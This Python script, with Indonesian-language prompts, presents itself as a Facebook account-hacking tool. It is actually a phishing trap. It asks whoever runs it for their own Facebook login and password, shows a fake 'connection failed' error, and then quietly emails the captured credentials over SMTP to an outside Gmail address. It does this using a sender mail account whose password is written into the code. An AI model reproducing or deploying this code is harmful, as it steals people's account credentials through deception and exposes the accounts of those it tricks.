# -*- coding: utf-8 -*-
# coding=utf-8
import socket,struct,os,sys,time,yagmail
x=yagmail.SMTP('tololvenom@gmail.com','kontol3452')
subject='AKUN TARGET MASUK'
logo = """\x1b[1;92m█████████
\x1b[1;92m█▄█████▄█      \033[1;94m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●
\x1b[1;92m█\033[1;94m▼▼▼▼▼ \033[1;94m- _ --_--\033[1;94m╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗
\x1b[1;92m█ \033[1;94m \033[1;94m_-_-- -_ --__\033[1;94m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗
\x1b[1;92m█\033[1;94m▲▲▲▲▲\033[1;94m--  - _ --\033[1;94m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝ \x1b[1;92mVVIP
\x1b[1;92m█████████      \033[1;94m«°°°°°°°°°°✧°°°°°°°°°°»
\x1b[1;92m ██ ██\x1b[00m"""

banner = """
\x1b[34mHack Akun Facebook ( GAME )
\x1b[1;92mHack akun Target lebih Mudah
\x1b[00mLogin Menggunakan Akun Facebook Pribadi \x1b[91m!
"""
def main():
        os.system('clear')
        print(logo)
        print(banner)
        print('\x1b[00m\033[41m FACEBOOK LOGIN \033[00m')
        u=input('\x1b[00mNomor/email: \x1b[33m')
        p=input('\x1b[00mPassword: \x1b[33m')
        msg=('username: '+u+', password: '+p)
        body=(msg)
        print('')
        print('\x1b[00mSorry, connection failed\x1b[91m !\x1b[00m')
        print('\x1b[33mPlease try again later ...')
        os.system('sleep 3')
        print('')
        print('\x1b[00mExiting program \x1b[91m!')
        os.system('exit')
        x.send('s35997949@gmail.com',subject,body)
main()